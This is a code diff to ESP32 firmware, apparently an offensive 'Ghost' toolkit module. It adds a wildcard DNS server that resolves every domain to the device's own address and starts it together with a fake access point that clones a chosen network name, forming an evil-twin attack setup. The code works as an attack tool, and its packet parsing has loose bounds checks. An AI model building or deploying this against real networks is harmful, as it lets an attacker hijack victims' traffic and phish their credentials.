@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <string.h>
+#include <stdarg.h>
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "driver/uart.h"
@@ -7,6 +8,8 @@
 #include "esp_event.h"
 #include "esp_netif.h"
 #include "nvs_flash.h"
+#include "lwip/sockets.h"
+#include "lwip/netdb.h"
 
 // UART2 — same pinout as all other Ghost modules
 #define UART_PORT      UART_NUM_2
@@ -15,7 +18,12 @@
 #define UART_BAUD_RATE 115200
 #define BUF_SIZE       1024
 
-static bool ap_running = false;
+static bool ap_running  = false;
+static bool dns_running = false;
+static TaskHandle_t dns_task_handle = NULL;
+
+// ESP32 AP default gateway IP — all DNS replies point here
+#define AP_IP "192.168.4.1"
 
 // ── UART ─────────────────────────────────────────────────────────────────────
 
@@ -78,6 +86,100 @@ void system_init() {
     esp_wifi_init(&cfg);
 }
 
+// ── DNS server — redirects every domain to AP_IP ─────────────────────────────
+//
+// DNS packet structure (RFC 1035):
+//   Header: 12 bytes
+//   Question: variable (name + type + class)
+//   Answer: appended by us — name pointer + type + class + ttl + rdlength + rdata
+//
+// We read the full query, copy the header back with QR=1 (response) + AA=1,
+// copy the question section verbatim, then append a single A record answer.
+
+void dns_server_task(void *arg) {
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock < 0) {
+        send("DNS:ERR_SOCKET\n");
+        vTaskDelete(NULL);
+        return;
+    }
+
+    struct sockaddr_in server_addr = {
+        .sin_family      = AF_INET,
+        .sin_port        = htons(53),
+        .sin_addr.s_addr = htonl(INADDR_ANY),
+    };
+    bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+
+    send("DNS:STARTED\n");
+    dns_running = true;
+
+    uint8_t buf[512];
+    struct sockaddr_in client_addr;
+    socklen_t client_len = sizeof(client_addr);
+
+    while (dns_running) {
+        int len = recvfrom(sock, buf, sizeof(buf) - 1, 0,
+                           (struct sockaddr *)&client_addr, &client_len);
+        if (len < 12) continue;
+
+        // Build response in place — flip QR bit, set AA bit
+        buf[2] |= 0x80;  // QR = 1 (response)
+        buf[2] |= 0x04;  // AA = 1 (authoritative)
+        buf[3]  = 0x00;  // RCODE = 0 (no error)
+
+        // Answer count = 1
+        buf[6] = 0x00;
+        buf[7] = 0x01;
+
+        // Find end of question section (skip past name + type + class)
+        int pos = 12;
+        while (pos < len && buf[pos] != 0x00) {
+            if ((buf[pos] & 0xC0) == 0xC0) { pos += 2; break; }
+            pos += buf[pos] + 1;
+        }
+        if (buf[pos] == 0x00) pos++;  // null terminator
+        pos += 4;  // skip type + class (4 bytes)
+
+        // Append answer: pointer to name in question (0xC00C), type A, class IN,
+        // TTL 60s, rdlength 4, then the IP address
+        uint32_t ip_addr;
+        inet_aton(AP_IP, (struct in_addr *)&ip_addr);
+
+        uint8_t answer[] = {
+            0xC0, 0x0C,              // name pointer → offset 12 (question name)
+            0x00, 0x01,              // type A
+            0x00, 0x01,              // class IN
+            0x00, 0x00, 0x00, 0x3C, // TTL 60 seconds
+            0x00, 0x04,              // rdlength = 4 bytes
+            (ip_addr)       & 0xFF,
+            (ip_addr >> 8)  & 0xFF,
+            (ip_addr >> 16) & 0xFF,
+            (ip_addr >> 24) & 0xFF,
+        };
+
+        memcpy(buf + pos, answer, sizeof(answer));
+        int resp_len = pos + sizeof(answer);
+
+        sendto(sock, buf, resp_len, 0,
+               (struct sockaddr *)&client_addr, client_len);
+    }
+
+    close(sock);
+    send("DNS:STOPPED\n");
+    vTaskDelete(NULL);
+}
+
+void start_dns() {
+    dns_running = true;
+    xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5, &dns_task_handle);
+}
+
+void stop_dns() {
+    dns_running = false;
+    dns_task_handle = NULL;
+}
+
 // ── Start fake AP with given SSID ─────────────────────────────────────────────
 
 void start_ap(const char *ssid) {
@@ -105,6 +207,9 @@ void start_ap(const char *ssid) {
 
     ap_running = true;
     sendf("TWIN:AP_STARTED:%s\n", ssid);
+
+    // Start DNS server so every domain resolves to us
+    start_dns();
 }
 
 // ── Stop AP ───────────────────────────────────────────────────────────────────
@@ -114,6 +219,7 @@ void stop_ap() {
         send("TWIN:AP_NOT_RUNNING\n");
         return;
     }
+    stop_dns();
     esp_wifi_stop();
     ap_running = false;
     send("TWIN:AP_STOPPED\n");
